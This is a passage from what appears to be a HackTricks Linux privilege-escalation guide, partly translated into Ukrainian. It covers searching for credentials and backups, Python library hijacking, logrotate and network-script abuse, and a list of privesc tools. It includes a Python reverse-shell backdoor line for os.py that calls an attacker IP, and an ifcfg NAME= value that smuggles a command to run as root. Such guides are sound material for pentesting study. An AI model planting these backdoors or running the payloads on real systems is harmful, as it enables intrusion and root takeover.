ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити паролі**.\  
**Ще один цікавий інструмент**, який ви можете використати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — програма з відкритим кодом, яка використовується для отримання великої кількості паролів, збережених на локальному комп'ютері для Windows, Linux & Mac.

### Logs

Якщо ви можете читати logs, можливо, ви зможете знайти в них **цікаву/конфіденційну інформацію**. Чим дивніший log, тим цікавішим він буде (ймовірно).\  
Також деякі "**bad**" налаштовані (backdoored?) **audit logs** можуть дозволити вам **записувати паролі** всередині audit logs, як пояснено в цьому пості: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб читати логи, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Варто також перевіряти файли, що містять слово "**password**" у своїй **назві** або всередині **вмісту**, а також шукати IP-адреси та електронні адреси в логах або регулярні вирази для хешів.\
Я не збираюся тут описувати, як усе це робити, але якщо вас цікавить, можете переглянути останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Python library hijacking

Якщо ви знаєте, **звідки** буде виконуватися python-скрипт і ви **можете записувати всередині** тієї папки або **можете модифікувати python-бібліотеки**, ви можете змінити бібліотеку os і встановити backdoor (якщо ви можете записувати туди, де буде виконуватися python-скрипт, скопіюйте та вставте бібліотеку os.py).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Експлуатація Logrotate

Уразливість у `logrotate` дозволяє користувачам з **права на запис** у файл логів або в батьківські директорії потенційно отримати підвищені привілеї. Це тому, що `logrotate`, який часто запускається як **root**, можна змусити виконати довільні файли, особливо в директоріях на кшталт _**/etc/bash_completion.d/**_. Важливо перевіряти права не лише в _/var/log_, але й у будь-яких директоріях, де застосовується ротація логів.

> [!TIP]
> Ця вразливість стосується версій `logrotate` `3.18.0` і старіших

Детальнішу інформацію про вразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ви можете експлуатувати цю вразливість за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця вразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тому що коли ви виявите, що можете змінювати логи, перевірте, хто керує цими логами, і чи можна підвищити привілеї, замінивши логи на symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Посилання на вразливість:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо з якоїсь причини користувач здатен **записати** скрипт `ifcf-<whatever>` у _/etc/sysconfig/network-scripts_ **або** **змінити** існуючий, то ваша **system is pwned**.

Network scripts, _ifcg-eth0_ наприклад, використовуються для мережевих підключень. Вони виглядають точно як .INI файли. Однак вони \~sourced\~ на Linux від Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` у цих мережевих скриптах обробляється неправильно. Якщо у назві є **пробіл**, система намагається виконати частину після пробілу. Це означає, що **все після першого пробілу виконується як root**.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network та /bin/id_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

Натомість `/etc/init` пов'язаний з **Upstart**, новішою системою **service management**, яку ввів Ubuntu, що використовує конфігураційні файли для задач управління сервісами. Незважаючи на перехід до Upstart, SysVinit скрипти все ще використовуються поряд з конфігураціями Upstart через суміснісний шар у Upstart.

**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.

## Інші хитрощі

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations can extract a binary path from process command lines and execute it with -v under a privileged context. Permissive patterns (e.g., using \S) may match attacker-staged listeners in writable locations (e.g., /tmp/httpd), leading to execution as root (CWE-426 Untrusted Search Path).

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Більше допомоги

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
